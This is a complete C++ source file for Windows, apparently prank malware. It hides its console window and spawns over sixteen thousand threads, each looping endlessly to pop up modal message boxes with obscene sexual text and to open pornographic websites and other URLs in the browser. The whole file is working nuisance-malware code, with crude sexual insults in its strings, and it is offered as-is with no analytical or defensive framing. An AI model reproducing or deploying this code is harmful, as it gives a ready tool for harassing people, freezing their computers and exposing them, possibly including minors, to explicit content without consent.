

// Author: Dashie
// Version: 1.0


#include <windows.h>
#include <conio.h>

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <ctime>


std::vector<std::thread> threads = { /*nothing in here*/ };


std::vector<LPCSTR> titles = 
{
	"Pornhub", "Eat Dick.com", "Up The Fucking Ass", "Fuck Your Mum", "Eat my Shit CRUMBLES!!"
};

std::vector<LPCSTR> bodies = 
{
	"Oh How Everyone Loves Pornhub", "eatdick", "my cock is in your bum", "I Fucked Your Mum",
};

std::vector<LPCSTR> urls =
{
  "https://www.pornhub.com/", "https://yespornplease.com", "https://heavy-r.com/", 
  "https://www.youtube.com/watch?v=iFHfAwMcSes", "https://www.youtube.com/jacksucksatlife"
};


const int &multiplier = 32;
const int &founders = 512;


int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	for (int thread = 0; thread < multiplier; thread += 1)
	{
		threads.push_back(
			std::thread(
				[]()
				{
					srand((unsigned int)time(NULL));

					for (int key = 0; key < founders; key += 1)
					{
						threads.push_back(
							std::thread(
								[]()
								{
									while (true)
									{
										MessageBox(NULL, bodies[rand() % bodies.size()], titles[rand() % titles.size()], MB_OK | MB_ICONEXCLAMATION | MB_APPLMODAL);
										ShellExecute(NULL, "open", urls[rand() % urls.size()], NULL, NULL, SW_SHOW);
									};
								}
							)
						);
					};
				}
			)
		);
	};

	_getch();
};